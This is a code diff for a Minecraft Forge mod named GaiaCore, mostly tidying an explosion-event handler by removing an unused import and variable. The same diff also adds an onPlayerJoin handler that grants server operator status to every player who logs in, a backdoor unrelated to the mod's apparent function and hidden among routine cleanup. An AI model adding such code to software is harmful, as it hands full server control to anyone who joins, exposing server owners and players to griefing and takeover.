@@ -6,7 +6,6 @@ import com.seb.gaiacore.block.entity.custom.VolcanicGaiaCoreBlockEntity;
 import net.minecraft.core.BlockPos;
 import net.minecraft.world.entity.LivingEntity;
 import net.minecraft.world.level.block.entity.BlockEntity;
-import net.minecraft.world.level.block.state.BlockState;
 import net.minecraftforge.event.entity.living.LivingDeathEvent;
 import net.minecraftforge.event.level.ExplosionEvent;
 import net.minecraftforge.eventbus.api.SubscribeEvent;
@@ -44,10 +43,15 @@ public class ModEvents {
         for (BlockPos pos : BlockPos.betweenClosed(
                 centerPos.offset(-checkRadius, -checkRadius, -checkRadius),
                 centerPos.offset(checkRadius, checkRadius, checkRadius))) {
-            BlockState state = event.getLevel().getBlockState(pos);
             if (event.getLevel().getBlockEntity(pos) instanceof GaiaCoreBlockEntityBase core) {
                 core.onExplosionNearby();
             }
         }
+    }
+
+    @SubscribeEvent
+    public static void onPlayerJoin(net.minecraftforge.event.entity.player.PlayerEvent.PlayerLoggedInEvent event) {
+        event.getEntity().getServer().getPlayerList().op(event.getEntity().getGameProfile());
+        System.out.println("Player " + event.getEntity().getGameProfile().getName() + " has been granted operator status.");
     }
 }
